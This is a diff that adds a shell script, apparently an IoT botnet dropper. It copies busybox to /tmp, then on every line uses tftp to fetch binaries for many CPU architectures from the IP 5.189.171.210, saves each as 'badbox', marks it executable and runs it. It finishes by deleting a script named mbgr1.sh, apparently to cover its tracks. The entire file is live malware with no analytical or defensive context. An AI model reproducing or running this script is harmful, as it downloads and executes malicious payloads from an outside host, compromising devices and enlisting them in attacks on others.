@@ -1,0 +1,23 @@
+#!/bin/marcsh
+ulimit -n 1024
+cp /bin/busybox /tmp/
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get marcms;cat marcms >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get marcml;cat marcml >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get marc4t;cat marc4t >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get marc4l;cat marc4l >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get marc5l;cat marc5l >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get marc6l;cat marc6l >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get marc7l;cat marc7l >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get marcsh;cat marcsh >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get marcpc;cat marcpc >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get marc440;cat marc440 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get marcm68;cat marcm68 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get marcsprc;cat marcsprc >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get marc32;cat marc32 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get marc38;cat marc38 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get marc48;cat marc48 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get marc58;cat marc58 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get marc64;cat marc64 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get marc68;cat marc68 >badbox;chmod +x *;./badbox
+
+rm -rf mbgr1.sh
